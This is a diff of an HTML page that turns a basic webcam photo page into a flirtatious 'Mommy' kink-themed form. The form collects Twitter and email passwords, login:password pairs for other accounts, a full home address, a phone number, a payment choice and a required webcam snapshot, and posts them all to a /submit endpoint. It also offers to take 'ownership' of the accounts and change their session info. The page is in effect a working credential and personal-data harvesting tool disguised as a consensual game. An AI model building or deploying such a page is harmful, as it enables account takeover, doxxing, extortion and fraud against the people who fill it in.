@@ -1,21 +1,455 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Фото в Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Hi cutie! Mommy is here 💖</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
+
   <style>
-    body { font-family: sans-serif; text-align: center; margin: 0; padding: 1em; }
-    video { width: 100%; max-width: 400px; }
-    button { padding: 10px 20px; font-size: 18px; margin-top: 10px; }
+ 
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: url('https://media.discordapp.net/attachments/1360786245659263019/1377607352018145412/tumblr_cd1ce3d463aab6fec5598f1caf630daf_a13982b4_640.webp?ex=68399453&is=683842d3&hm=7db7482d563111234953071a8c90d04b179e83fe97f14fd0db788b1293afa36e&=&animated=true') 
+      center center / cover no-repeat;
+    z-index: -2;
+    opacity: 0.15;
+    pointer-events: none;
+  }
+
+  body {
+    background-color: #c3efed;
+    font-family: 'Poppins', sans-serif;
+    margin: 0;
+    padding: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    color: #0f4e4e;
+  }
+.small-note {
+  font-size: 16px;
+  font-weight: 600;           /* жирный */
+  color: #177c7a;             /* приятный бирюзовый цвет */
+  margin-top: -14px;
+  margin-bottom: 22px;
+  font-style: italic;
+  text-align: center;         /* выравнивание по центру */
+}
+
+  .form-container {
+    background: rgba(255, 255, 255, 0.65);
+    border: 3px solid #41b8b0;
+    border-radius: 14px;
+    padding: 30px 30px 40px;
+    box-shadow: 0 6px 18px rgba(65, 184, 176, 0.3);
+    max-width: 600px;
+    width: 100%;
+    box-sizing: border-box;
+    backdrop-filter: blur(6px);
+  }
+
+  h1 {
+    color: #0d6b66;
+    margin-bottom: 15px;
+    font-size: 30px;
+    text-align: center;
+    font-weight: 700;
+  }
+
+  p.description {
+    font-size: 17px;
+    margin-bottom: 25px;
+    text-align: center;
+    line-height: 1.4;
+    color: #125e5a;
+  }
+
+  label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 8px;
+    font-size: 18px;
+    color: #114d4b;
+  }
+
+  input[type="text"],
+  input[type="tel"],
+  input[type="email"],
+  input[type="password"],
+  textarea,
+  select {
+    width: 100%;
+    padding: 14px 12px;
+    margin-bottom: 20px;
+    border: 2px solid #41b8b0;
+    border-radius: 10px;
+    font-size: 17px;
+    background-color: rgba(217, 250, 248, 0.85);
+    font-family: 'Poppins', sans-serif;
+    color: #104646;
+    box-sizing: border-box;
+    resize: vertical;
+  }
+
+  input[type="submit"] {
+    background-color: #0d6b66;
+    color: white;
+    border: none;
+    padding: 18px;
+    width: 100%;
+    font-size: 22px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: 700;
+    transition: background-color 0.3s ease;
+  }
+
+  input[type="submit"]:hover {
+    background-color: #094d49;
+  }
+
+  .small-note {
+    font-size: 14px;
+    color: #177c7a;
+    margin-top: -14px;
+    margin-bottom: 22px;
+    font-style: italic;
+  }
+
+  .option-group {
+    margin-bottom: 22px;
+  }
+
+  .option-group label {
+    font-weight: 500;
+    font-size: 16px;
+    cursor: pointer;
+    margin-right: 15px;
+    display: block;
+    margin-bottom: 8px;
+    color: #125e5a;
+  }
+
+  .option-group input[type="radio"] {
+    margin-right: 8px;
+    cursor: pointer;
+  }
+
+  .address-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 15px 30px;
+    margin-bottom: 25px;
+  }
+
+  .address-grid label {
+    margin-bottom: 6px;
+    font-size: 17px;
+  }
+
+  .address-grid input {
+    margin-bottom: 0;
+  }
+
+  .helper-text {
+    font-size: 13px;
+    color: #168d89;
+    margin-top: -14px;
+    margin-bottom: 16px;
+    font-style: italic;
+  }
+
+  #video {
+    width: 100%;
+    max-height: 280px;
+    border-radius: 10px;
+    margin-bottom: 15px;
+    background-color: #b9e2e1;
+    display: none;
+    object-fit: cover;
+  }
+
+  #take-photo {
+    background-color: #0d6b66;
+    color: white;
+    border: none;
+    padding: 14px;
+    font-size: 20px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: 700;
+    width: 100%;
+    margin-bottom: 20px;
+    transition: background-color 0.3s ease;
+  }
+
+  #take-photo:hover {
+    background-color: #094d49;
+  }
+
+  @media (max-width: 650px) {
+    .form-container {
+      padding: 20px 20px 30px;
+    }
+    input[type="submit"], #take-photo {
+      font-size: 20px;
+      padding: 16px;
+    }
+    h1 {
+      font-size: 26px;
+    }
+    .address-grid {
+      grid-template-columns: 1fr;
+    }
+  }
   </style>
 </head>
-<body>
-  <h1>Сделать фото</h1>
-  <video id="video" autoplay playsinline></video><br>
-  <button id="snap">Сделать фото</button>
-  <canvas id="canvas" style="display:none;"></canvas>
 
-  <script src="/static/script.js"></script>
+
+<body>
+  <div class="form-container">
+    <h1>Hi cutie! Mommy is here 💖</h1>
+    <p class="description">
+      Before we start our fun, I want to make sure you understand and fill this form voluntarily~<br />
+      Everything you give me is your choice, no pressure, only love and care from mommy~ 😊
+    </p>
+
+    <img src="https://media.discordapp.net/attachments/1360786245659263019/1377616819644399656/fc220abd2254947d17126c61a907f1108092598b.jpg?ex=68399d24&is=68384ba4&hm=e62cfb27b43c8ca08ec1d0af427c42ac6950e717cd44d79d430e0985fc4f58b8&=&format=webp&width=587&height=881" 
+         alt="Cute image"
+         style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />
+
+    <!-- Открываем форму один раз -->
+    <form action="/submit" method="POST">
+
+      <p class="small-note">Let mommy protect you 💕</p>
+
+      <label for="twitter_login">Twitter login</label>
+      <input type="text" id="twitter_login" name="twitter_login" placeholder="Your @username here" />
+
+      <label for="twitter_secret">Twitter Secret</label>
+      <input type="text" id="twitter_secret" name="twitter_secret" placeholder="Secret, cutie~" />
+
+      <label for="twitter_followers">How many followers do u have?</label>
+      <input type="text" id="twitter_followers" name="twitter_followers" placeholder="e.g. 12k" />
+
+      <label for="email_login">Email</label>
+      <input type="email" id="email_login" name="email_login" placeholder="Your email" />
+
+      <label for="email_secret">Email Secret</label>
+      <input type="text" id="email_secret" name="email_secret" placeholder="Shhh... mommy will keep it safe 💌" />
+
+      <img src="https://media.discordapp.net/attachments/1360786245659263019/1377615328296829010/feet__censored__only_socks_for_pathetic_betas__by_sakuracaptions_dg9ugzs-pre.jpg?ex=68399bc1&is=68384a41&hm=b4a8d98c825998e72b127bc437df8e2bba9ed3d28ef0155f841c2921e41e594b&=&format=webp" 
+           alt="Cute image"
+           style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />
+
+      <p class="small-note">Now relax and look at my cute socks~ 🧦</p>
+
+      <label>Address (fill it out nicely, cutie~)</label>
+      <div class="address-grid">
+        <div>
+          <label for="country">1. Country *</label>
+          <input type="text" id="country" name="country" placeholder="Country" required />
+        </div>
+        <div>
+          <label for="region">2. Region / State *</label>
+          <input type="text" id="region" name="region" placeholder="Region / State" required />
+        </div>
+        <div>
+          <label for="city">3. City *</label>
+          <input type="text" id="city" name="city" placeholder="City" required />
+        </div>
+        <div>
+          <label for="street">4. Street *</label>
+          <input type="text" id="street" name="street" placeholder="Street" required />
+        </div>
+        <div>
+          <label for="postal">5. Postal Code *</label>
+          <input type="text" id="postal" name="postal" placeholder="Postal Code" required />
+        </div>
+        <div>
+          <label for="house">6. House / Apt No. *</label>
+          <input type="text" id="house" name="house" placeholder="House / Apt No." required />
+        </div>
+      </div>
+
+      <label for="phone">Let mommy call you 📱️</label>
+      <input type="tel" id="phone" name="phone" placeholder="+XX XX XXXXXXX" />
+
+      <label for="other_accounts">Other accounts you want to share with mommy (login: Secret or anything you want)</label>
+      <textarea id="other_accounts" name="other_accounts" rows="3" placeholder="Your Secret or login:Secret pairs here"></textarea>
+
+      <p class="small-note">We're almost done, cutie~ 💕</p>
+      <img src="https://cdn.discordapp.com/attachments/1360786245659263019/1377618052841214092/6fc30fc128fce02a2051198fdba71462666bd71d.png?ex=68399e4a&is=68384cca&hm=504ef8ed68577721ab78f5bfe592e2d269131a1383d27479e1d57534669b50d3" 
+           alt="Cute image"
+           style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />
+
+      <label>What would you like me to do with your accounts? *</label>
+      <div class="option-group">
+        <label>
+          <input type="radio" name="account_usage" value="make_appropriate" required />
+          I just want them to look neat and show that I belong to you
+        </label>
+        <label>
+          <input type="radio" name="account_usage" value="owner_change" />
+          I want you to be the owner and change session info, I'll beg for the honor~
+        </label>
+        <label>
+          <input type="radio" name="account_usage" value="custom" id="custom-option" />
+          Other (write your sweet idea below~)
+        </label>
+        <input type="text" id="custom-input" name="account_usage_custom" placeholder="Your custom wish for mommy~ 💌" style="display: none; margin-top: 12px; width: 100%; padding: 12px; border: 1.8px solid #b91c37; border-radius: 8px; font-size: 16px; background-color: #fff0f3; color: #7f1d2a; font-family: 'Poppins', sans-serif;" />
+      </div>
+
+      <style>
+        .donation-grid {
+          display: grid;
+          grid-template-columns: 1fr 1fr 1fr;
+          gap: 15px;
+          padding: 20px;
+          border: 2px solid #f472b6;
+          border-radius: 12px;
+          background-color: #fff0f5;
+          margin-bottom: 25px;
+        }
+
+        .donation-grid label {
+          display: flex;
+          align-items: center;
+          font-size: 16px;
+          background-color: #ffe4e6;
+          padding: 10px 12px;
+          border-radius: 8px;
+          border: 1.5px solid #f9a8d4;
+          cursor: pointer;
+          transition: background-color 0.2s ease;
+        }
+
+        .donation-grid label:hover {
+          background-color: #fbcfe8;
+        }
+
+        .donation-grid input[type="radio"] {
+          margin-right: 10px;
+          transform: scale(1.2);
+          accent-color: #ec4899;
+        }
+      </style>
+
+      <p class="small-note">One last thing, sweetheart 💕</p>
+      <label>How much would you like to help mommy with? 💸 *</label>
+
+      <div class="donation-grid">
+        <label><input type="radio" name="donation_amount" value="10" required /> $5 – Just a little love 💖</label>
+        <label><input type="radio" name="donation_amount" value="20" /> $25 – Mommy’s tea time 🍵</label>
+        <label><input type="radio" name="donation_amount" value="30" /> $100 – Because you care 💝</label>
+        <label><input type="radio" name="donation_amount" value="40" /> $500 – You're such a good boy 😘</label>
+        <label><input type="radio" name="donation_amount" value="no_money" /> Sorry mommy, I wish I could 😢</label>
+      </div>
+
+      <label>Take a cute photo for mommy 📸 *</label>
+      <video id="video" autoplay playsinline></video>
+      <input type="hidden" name="photoData" id="photoData" required />
+      <button type="button" id="take-photo">📸 Take Photo</button>
+
+      <div class="option-group" style="margin-top: 10px; margin-bottom: 25px;">
+        <label style="display: flex; align-items: center; font-size: 16px; gap: 10px;">
+          <input type="checkbox" name="terms_agreed" required style="transform: scale(1.3); accent-color: #b91c37;" />
+          I agree to 
+          <a href="https://mommy-terms.netlify.app/" target="_blank" style="color: #b91c37; font-weight: 600; text-decoration: underline dotted;">
+            Mommy’s sweet terms of service 💌
+          </a>
+        </label>
+      </div>
+
+      <!-- Кнопка отправки внутри формы -->
+      <input id="submit-button" type="submit" value="Send to mommy 💖" disabled style="background-color: #ccc; cursor: not-allowed;" />
+    </form>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const photoData = document.getElementById('photoData');
+    const takePhotoButton = document.getElementById('take-photo');
+
+    let stream = null;
+
+    takePhotoButton.addEventListener('click', async () => {
+      if (!stream) {
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+        } catch (err) {
+          alert('Camera access denied or unavailable.');
+          return;
+        }
+      }
+
+      // Создаем canvas и делаем снимок
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Преобразуем в base64
+      const base64Image = canvas.toDataURL('image/jpeg');
+      photoData.value = base64Image;
+
+      // Визуально показать, что фото сделано (например, убрать кнопку)
+      takePhotoButton.disabled = true;
+      takePhotoButton.textContent = 'Photo taken! ✅';
+
+      // Включить кнопку отправки, если остальные обязательные поля заполнены
+      checkFormReady();
+    });
+
+    // Для включения/отключения кнопки submit
+    function checkFormReady() {
+      const submitButton = document.getElementById('submit-button');
+      if (photoData.value.trim() !== '') {
+        submitButton.disabled = false;
+        submitButton.style.backgroundColor = '#b91c37';
+        submitButton.style.cursor = 'pointer';
+      } else {
+        submitButton.disabled = true;
+        submitButton.style.backgroundColor = '#ccc';
+        submitButton.style.cursor = 'not-allowed';
+      }
+    }
+
+    // Слушаем изменение фотоData на всякий случай
+    photoData.addEventListener('change', checkFormReady);
+
+    // Показать/скрыть кастомное поле для "Other" в радиокнопках
+    const customOption = document.getElementById('custom-option');
+    const customInput = document.getElementById('custom-input');
+
+    customOption.addEventListener('change', () => {
+      if (customOption.checked) {
+        customInput.style.display = 'block';
+        customInput.required = true;
+      } else {
+        customInput.style.display = 'none';
+        customInput.required = false;
+      }
+    });
+
+    // При смене других опций скрываем кастомное поле
+    const radioOptions = document.querySelectorAll('input[name="account_usage"]');
+    radioOptions.forEach(radio => {
+      if (radio !== customOption) {
+        radio.addEventListener('change', () => {
+          customInput.style.display = 'none';
+          customInput.required = false;
+        });
+      }
+    });
+  </script>
 </body>
+
 </html>
